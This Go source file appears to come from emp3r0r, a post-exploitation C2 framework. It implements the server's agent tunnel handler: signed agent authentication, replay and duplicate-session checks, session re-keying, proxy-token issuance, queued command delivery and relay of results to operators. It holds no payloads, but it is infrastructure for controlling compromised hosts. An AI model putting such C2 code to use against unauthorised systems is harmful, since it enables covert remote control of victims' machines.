package server

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/jobs"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

const maxCmdResultCacheBytes = 1024 * 1024 // 1 MiB

// handshakeTimeout is the maximum silence allowed on a message tunnel before
// it is torn down. It is a var so tests can shorten it.
var handshakeTimeout = 10 * time.Minute

// handshakeCheckInterval is how often the tunnel checks the handshake timer.
// It is a var so tests can shorten it.
var handshakeCheckInterval = 20 * time.Second

// handleMessageTunnelStream is the protocol-native message tunnel handler.
// It is transport-agnostic and only depends on a bidirectional byte stream.
// secureConn is already authenticated and its first frame (MsgAuth) consumed by dec.
func handleMessageTunnelStream(secureConn *transport.SecureConn, dec *cbor.Decoder, remoteAddr string, baseCtx context.Context, initialAgentUUID string) {
	// Session identity is payload-authoritative, but we seed it with the
	// already-verified MsgAuth UUID so admission/teardown decisions can use it
	// immediately.
	authAgentUUID := initialAgentUUID
	sessionStarted := false
	var (
		lastHandshake int64
		err           error
	)
	atomic.StoreInt64(&lastHandshake, time.Now().Unix())

	ctx, cancel := context.WithCancel(baseCtx)
	if logging.Level >= 4 {
		logging.Debugf("handleMessageTunnel: stream start uuid=%s remote=%s", initialAgentUUID, remoteAddr)
	}
	var wg sync.WaitGroup
	defer func() {
		logging.Debugf("handleMessageTunnel exiting")
		cancel() // Signal goroutine to stop
		// Close the connection BEFORE waiting for the read goroutine.
		// The goroutine blocks on dec.Decode() reading from this conn, so
		// without closing first wg.Wait() would deadlock until the agent
		// happens to send another frame (e.g. a command response).
		_ = secureConn.Close()
		wg.Wait() // Wait for goroutine to finish before returning

		agent, ctrl, key, found := agents.RuntimeControlByConn(secureConn)
		if !found {
			// The agent may have been admitted but never sent a frame on this
			// tunnel (e.g. operator idle teardown before the first hello). In
			// that case ctrl.Conn is still nil and RuntimeControlByConn cannot
			// find it; fall back to the authenticated UUID so it is removed
			// from the operator-facing list instead of showing a stale,
			// ever-growing LastSeen.
			agent, ctrl, key, found = agents.RuntimeControlByUUID(authAgentUUID)
			if found && ctrl != nil && ctrl.Conn != nil && ctrl.Conn != secureConn {
				found = false // another live tunnel owns this agent
			}
		}
		if logging.Level >= 4 {
			ctrlConnNil := ctrl == nil || ctrl.Conn == nil
			logging.Debugf("handleMessageTunnel: teardown uuid=%s found=%v ctrlConnNil=%v", authAgentUUID, found, ctrlConnNil)
		}
		if found {
			live.AgentControlMap.Delete(key)
			if endErr := agents.EndSession(agent.UUID); endErr != nil {
				logging.Debugf("handleMessageTunnel: end session for %s failed: %v", strconv.Quote(agent.UUID), endErr)
			}
			name := agent.Name
			if name == "" {
				name = agent.Tag
			}
			operatorBroadcastPrintf(logging.ERROR, "Agent dies... %s is disconnected", strconv.Quote(name))
		}
		logging.Debugf("handleMessageTunnel exited")
	}()
	// Track PFS state for this connection
	var pfsEstablished bool

	wg.Go(func() {
		defer cancel()
		for ctx.Err() == nil {
			var raw cbor.RawMessage
			err = dec.Decode(&raw)
			if err != nil {
				return
			}

			var msgAuth def.MsgAuth
			if err = cbor.Unmarshal(raw, &msgAuth); err == nil && msgAuth.Type == def.MsgAuthType {
				if err = transport.VerifyMsgAuth(&msgAuth); err != nil {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth verify failed from %s: %v", remoteAddr, err)
					return
				}
				if initialAgentUUID != "" && msgAuth.AgentUUID != initialAgentUUID {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth UUID %s does not match stream UUID %s", strconv.Quote(msgAuth.AgentUUID), strconv.Quote(initialAgentUUID))
					return
				}

				now := time.Now().Unix()
				nonceKey := msgAuth.AgentUUID + ":" + msgAuth.Nonce
				if prev, loaded := replayNonceCache.Load(nonceKey); loaded {
					if prevTS, okTS := prev.(int64); okTS && abs64(now-prevTS) <= transport.ReplayWindowSeconds {
						logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth replay detected for %s", strconv.Quote(msgAuth.AgentUUID))
						return
					}
				}
				replayNonceCache.Store(nonceKey, msgAuth.Timestamp)

				authAgentUUID = msgAuth.AgentUUID
				if agents.AgentDB == nil {
					logging.Errorf("CRITICAL: handleMessageTunnel: AgentDB unavailable for trust decision")
					return
				}
				pinnedKey, pinnedUUIDSig, found, lookupErr := agents.GetPinnedIdentity(authAgentUUID)
				if lookupErr != nil {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth trust lookup failed for %s: %v", strconv.Quote(authAgentUUID), lookupErr)
					return
				}
				if !found {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth unknown agent %s", strconv.Quote(authAgentUUID))
					return
				}
				if pinnedUUIDSig != "" && msgAuth.IdentityToken != "" && pinnedUUIDSig != msgAuth.IdentityToken {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth token mismatch for %s", strconv.Quote(authAgentUUID))
					return
				}
				if pinnedKey == "" {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth missing pinned key for %s", strconv.Quote(authAgentUUID))
					return
				}
				if msgAuth.AgentProof == "" {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth missing agent proof for %s", strconv.Quote(authAgentUUID))
					return
				}
				proof, decodeErr := base64.URLEncoding.DecodeString(msgAuth.AgentProof)
				if decodeErr != nil {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth bad proof encoding for %s: %v", strconv.Quote(authAgentUUID), decodeErr)
					return
				}
				canonical := transport.CanonicalAuthString(msgAuth.AgentUUID, msgAuth.Timestamp, msgAuth.Nonce, msgAuth.Capabilities)
				proofOK, proofErr := transport.VerifySignatureWithPEM([]byte(pinnedKey), []byte(canonical), proof)
				if proofErr != nil || !proofOK {
					logging.Errorf("CRITICAL: handleMessageTunnel: MsgAuth pinned key proof failed for %s: %v", strconv.Quote(authAgentUUID), proofErr)
					return
				}
				if hbErr := agents.UpdateSessionHeartbeat(authAgentUUID); hbErr != nil {
					logging.Errorf("CRITICAL: handleMessageTunnel: session heartbeat failed for %s: %v", strconv.Quote(authAgentUUID), hbErr)
					return
				}

				// SECURITY: Enforce duplicate session prevention on first authenticated MsgAuth.
				// Each UUID is limited to exactly one live session across all routes.
				if !sessionStarted {
					sessionID := fmt.Sprintf("%d", time.Now().UnixNano())
					sessionErr := agents.StartSession(authAgentUUID, sessionID, remoteAddr)
					if sessionErr != nil {
						if errors.Is(sessionErr, agents.ErrSessionAlreadyActive) {
							logging.Errorf("CRITICAL: handleMessageTunnel: duplicate live session blocked for %s from %s", strconv.Quote(authAgentUUID), remoteAddr)
							return
						}
						logging.Errorf("CRITICAL: handleMessageTunnel: session admission failed for %s: %v", strconv.Quote(authAgentUUID), sessionErr)
						return
					}
					sessionStarted = true
				}

				seenAt := time.Now()
				atomic.StoreInt64(&lastHandshake, seenAt.Unix())
				agents.MarkAgentSeenByUUID(authAgentUUID, seenAt)
				if agent := agents.GetAgentByUUID(authAgentUUID); agent != nil {
					if err := agents.UpdateAgentLastSeen(agent.UUID, seenAt); err != nil {
						logging.Warningf("handleMessageTunnel: persist last_seen for %s failed: %v", agent.UUID, err)
					}
				}
				if logging.Level >= 4 {
					logging.Debugf("handleMessageTunnel: MsgAuth keepalive uuid=%s lastHandshake=%d", authAgentUUID, seenAt.Unix())
				}

				continue
			}

			var msg def.MsgTunData
			err = cbor.Unmarshal(raw, &msg)
			if err != nil {
				logging.Errorf("CRITICAL: handleMessageTunnel: decode MsgTunData failed: %v", err)
				return
			}
			if authAgentUUID == "" {
				resolvedUUID, authErr := validateInitialMsgIdentity(&msg)
				if authErr != nil {
					logging.Errorf("CRITICAL: handleMessageTunnel: initial MsgTunData identity rejected: %v", authErr)
					return
				}
				authAgentUUID = resolvedUUID
			}
			if hbErr := agents.UpdateSessionHeartbeat(authAgentUUID); hbErr != nil {
				logging.Errorf("CRITICAL: handleMessageTunnel: session heartbeat failed for %s: %v", strconv.Quote(authAgentUUID), hbErr)
				return
			}
			// Sanitize agent metadata at trust boundary (after CBOR decode)
			util.SanitizeMsgTunMetadata(&msg)

			// match authenticated agent
			agent := agents.GetAgentByUUID(authAgentUUID)
			if agent == nil {
				if stored, err := agents.GetStoredAgent(authAgentUUID); err == nil && stored != nil {
					agent = &def.Emp3r0rAgent{
						UUID:      stored.UUID,
						Tag:       stored.Tag,
						UUIDSig:   stored.UUIDSig,
						PublicKey: stored.PublicKey,
						Hostname:  stored.Hostname,
						OS:        stored.OS,
						Arch:      stored.Arch,
						User:      stored.User,
						From:      remoteAddr,
					}
				} else {
					agent = &def.Emp3r0rAgent{
						UUID: authAgentUUID,
						Tag:  authAgentUUID,
						From: remoteAddr,
					}
				}
			}

			// SECURITY: prevent session hijacking where authenticated Agent A tries to send CBOR for Agent B
			if msg.AgentUUID != "" && msg.AgentUUID != authAgentUUID {
				logging.Errorf("CRITICAL: SECURITY: Agent %s attempted to hijack session for UUID %s", strconv.Quote(authAgentUUID), strconv.Quote(msg.AgentUUID))
				return
			}
			if msg.Tag != "" && agent.Tag != "" && msg.Tag != agent.Tag {
				logging.Errorf("CRITICAL: SECURITY: Agent %s attempted to hijack session for Tag %s", strconv.Quote(authAgentUUID), strconv.Quote(msg.Tag))
				return
			}

			// Agent authentication is payload-authoritative via MsgAuth / signed MsgTunData.
			shortname := agent.Name
			if shortname == "" {
				shortname = agent.Tag
			}
			var ctrl *live.AgentControl
			if val, ok := live.AgentControlMap.Load(agent); ok {
				ctrl = val.(*live.AgentControl)
			} else {
				ctrl = &live.AgentControl{Index: agents.AssignAgentIndex()}
			}
			if ctrl.Conn == nil {
				operatorBroadcastPrintf(logging.SUCCESS,
					"Knock.. Knock... Agent %s is connected",
					strconv.Quote(shortname))
			}
			now := time.Now()
			agents.MarkAgentSeen(agent, now)
			if logging.Level >= 4 {
				logging.Debugf("handleMessageTunnel: authenticated frame uuid=%s tag=%q cmd=%d resp=%d job=%q", authAgentUUID, msg.Tag, len(msg.CmdSlice), len(msg.Response), msg.JobID)
			}
			// Update control info and publish via Store to ensure memory visibility
			ctrl.Conn = secureConn
			ctrl.Ctx = ctx
			ctrl.Cancel = cancel
			live.AgentControlMap.Store(agent, ctrl)

			// Any authenticated frame (keep-alive hello OR command response)
			// proves the agent is still alive, so refresh the handshake timer
			// here too. Otherwise an agent that answers commands but whose
			// keep-alive loop stalls would be wrongly timed out after 10m.
			atomic.StoreInt64(&lastHandshake, now.Unix())
			if err := agents.UpdateAgentLastSeen(agent.UUID, now); err != nil {
				logging.Warningf("handleMessageTunnel: persist last_seen for %s failed: %v", agent.UUID, err)
			}
			if msg.Time != "" {
				startTime, err := time.Parse("2006-01-02 15:04:05.999999999 -0700 MST", msg.Time)
				if err == nil {
					agents.MarkAgentRTT(agent, time.Since(startTime))
				}
			}
			// handshake (hello) message has empty CmdSlice or just random data
			// but it's used to tell CC that agent is alive
			// here we just respond to keep-alive if it matches any criteria
			// or if it's explicitly a hello
			if msg.Response == nil && len(msg.CmdSlice) > 0 {
				if logging.Level >= 4 {
					logging.Debugf("handleMessageTunnel: hello received uuid=%s job=%q cmd=%d", authAgentUUID, msg.JobID, len(msg.CmdSlice))
				}
				// Check if context is still valid before writing
				if ctx.Err() != nil {
					logging.Debugf("Context cancelled, skipping handshake response")
					return
				}
				// verify hello
				logging.Debugf("Handshake from %s successful", msg.Tag)

				// ECDH Key Exchange Support
				replyData, sessionKey, err := processKeyExchange(&msg, pfsEstablished)
				if err != nil {
					logging.Errorf("Handshake processing error: %v", err)
					return
				}

				// respond with Server Public Key (or random data), wrapped in MsgTunData
				replyMsg := def.MsgTunData{
					JobID:    msg.JobID,
					Tag:      "handshake",
					Response: replyData,
				}
				encoder := cbor.NewEncoder(secureConn)
				err = encoder.Encode(replyMsg)
				if err == nil {
					if sessionKey != nil {
						// 6. Switch to Session Key (only if exchange was successful)
						secureConn.SetKey(sessionKey)
						if !pfsEstablished {
							logging.Infof("SecureConn: Switched to ephemeral session key for %s (PFS enabled)", msg.Tag)
							pfsEstablished = true
						} else {
							logging.Debugf("SecureConn: Re-keyed ephemeral session key for %s", msg.Tag)
						}
					}

					// Only push PeerList to TRUSTED agents (must have established PFS)
					// This ensures the layout is encrypted with the ephemeral session key and
					// we are talking to a successfully authenticated agent.
					if pfsEstablished {
						enrichedList, peerList, collectErr := collectEnrichedPeerList()
						if collectErr != nil {
							logging.Warningf("handleMessageTunnel: collectEnrichedPeerList for %s: %v", agent.Name, collectErr)
						}
						if len(peerList) > 0 || enrichedList != nil {
							peerMsg := def.MsgTunData{
								Tag:              def.TagPeerList,
								PeerList:         peerList,
								EnrichedPeerList: enrichedList,
							}
							if err := encoder.Encode(peerMsg); err != nil {
								logging.Errorf("handleMessageTunnel: send PeerList to %s: %v", agent.Name, err)
							}
						}
					}
				} else {
					logging.Warningf("handleMessageTunnel: %v", err)
				}

				// Issue AgentToken if missing or expiring within 6 hours.
				// Trust condition: agent has a live MsgTun session (checked-in + communicating).
				needsToken := agent.AgentToken == nil ||
					time.Until(time.Unix(agent.AgentToken.ExpiresAt, 0)) < 6*time.Hour
				if needsToken {
					tok, err := SignAgentToken(agent.UUID, agent.From, def.CapabilityProxy, 24*time.Hour)
					if err != nil {
						logging.Errorf("handleMessageTunnel: SignAgentToken for %s: %v", agent.Name, err)
					} else {
						tokData, _ := cbor.Marshal(tok)
						tokMsg := def.MsgTunData{
							Tag:      def.TagAgentToken,
							Response: tokData,
						}
						if err := encoder.Encode(tokMsg); err != nil {
							logging.Errorf("handleMessageTunnel: send AgentToken to %s: %v", agent.Name, err)
						} else {
							logging.Infof("Sent AgentToken(cap=proxy) to %s", agent.Name)
							agent.AgentToken = tok
						}
					}
				}

				// Deliver any commands queued while the agent had no live tunnel.
				if err == nil {
					drainQueuedCommands(agent.UUID, encoder)
				}

				continue // Handshake handled, next message
			}

			// if not a handshake, forward message to operators
			// also cache it for automated tests or local usage
			if msg.JobID != "" {
				if _, knownJob := live.CmdTime.Load(msg.JobID); knownJob {
					responseToCache := msg.Response
					if len(responseToCache) > maxCmdResultCacheBytes {
						logging.Warningf("handleMessageTunnel: truncating oversized response for job %s from %d to %d bytes", strconv.Quote(msg.JobID), len(responseToCache), maxCmdResultCacheBytes)
						responseToCache = responseToCache[:maxCmdResultCacheBytes]
					}
					live.CmdResults.Store(msg.JobID, string(responseToCache))
					// Signal any goroutine waiting for this job's result.
					if ch, ok := live.CmdResultsReady.LoadAndDelete(msg.JobID); ok {
						close(ch.(chan struct{}))
					}
					// persistence
					jobs.HandleOutput(msg.JobID, responseToCache)
				} else {
					logging.Warningf("handleMessageTunnel: dropping response for unknown job ID %s", strconv.Quote(msg.JobID))
				}

				if ownerSession, ok := getJobOwner(msg.JobID); ok {
					// Forward asynchronously. A slow/stuck operator must not block
					// this goroutine, otherwise keep-alive hellos stop being
					// processed and the agent is falsely timed out after 10m.
					msgCopy := msg
					go func() {
						if relayErr := fwdMsgToOperator(ownerSession, msgCopy); relayErr != nil {
							logging.Warningf("handleMessageTunnel: targeted relay failed for job %s owner %s: %v", strconv.Quote(msgCopy.JobID), strconv.Quote(ownerSession), relayErr)
						}
					}()
					continue
				}
				logging.Warningf("CRITICAL: no operator owner for job response %s from agent %s", strconv.Quote(msg.JobID), strconv.Quote(authAgentUUID))
				continue
			}
			err = fwdMsg2Operators(msg)
			if err != nil {
				logging.Warningf("handleMessageTunnel: %v", err)
				return
			}
		}
	})
	ticker := time.NewTicker(handshakeCheckInterval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			// Tear down tunnels when the operator goes offline or idle. The
			// agent will back off and retry later, and the C2 will admit it only
			// once the operator is online/active again.
			operatorActive := operatorIsActive()
			operatorOnlineNow := operatorOnline()
			lastHandshakeAge := time.Since(time.Unix(atomic.LoadInt64(&lastHandshake), 0))
			if logging.Level >= 4 {
				logging.Debugf("handleMessageTunnel: ticker uuid=%s operatorOnline=%v operatorActive=%v lastHandshakeAge=%s", authAgentUUID, operatorOnlineNow, operatorActive, lastHandshakeAge)
			}
			if !operatorActive {
				if operatorOnlineNow {
					maybeNotifyOperatorIdle()
				}
				logging.Infof("handleMessageTunnel: operator offline/idle, closing tunnel for agent %s", strconv.Quote(authAgentUUID))
				return
			}
			if lastHandshakeAge > handshakeTimeout {
				operatorBroadcastPrintf(logging.WARN, "handleMessageTunnel: timeout for agent %s", strconv.Quote(authAgentUUID))
				return
			}
		}
	}
}

func validateInitialMsgIdentity(msg *def.MsgTunData) (string, error) {
	if msg == nil {
		return "", fmt.Errorf("nil message")
	}
	if msg.AgentUUID == "" {
		return "", fmt.Errorf("empty AgentUUID")
	}
	if agents.AgentDB == nil {
		return "", fmt.Errorf("trust store unavailable")
	}
	pinnedKey, _, found, err := agents.GetPinnedIdentity(msg.AgentUUID)
	if err != nil {
		return "", fmt.Errorf("identity lookup failed: %w", err)
	}
	if !found {
		return "", fmt.Errorf("unknown agent %q", msg.AgentUUID)
	}

	if msg.AgentUUIDSig == "" {
		return "", fmt.Errorf("missing payload identity proof")
	}
	proof, err := base64.URLEncoding.DecodeString(msg.AgentUUIDSig)
	if err != nil {
		return "", fmt.Errorf("decode payload proof: %w", err)
	}

	if pinnedKey == "" {
		return "", fmt.Errorf("missing pinned public key for %q", msg.AgentUUID)
	}
	agentOK, err := transport.VerifySignatureWithPEM([]byte(pinnedKey), []byte(msg.AgentUUID), proof)
	if err != nil || !agentOK {
		return "", fmt.Errorf("agent identity proof invalid")
	}
	return msg.AgentUUID, nil
}
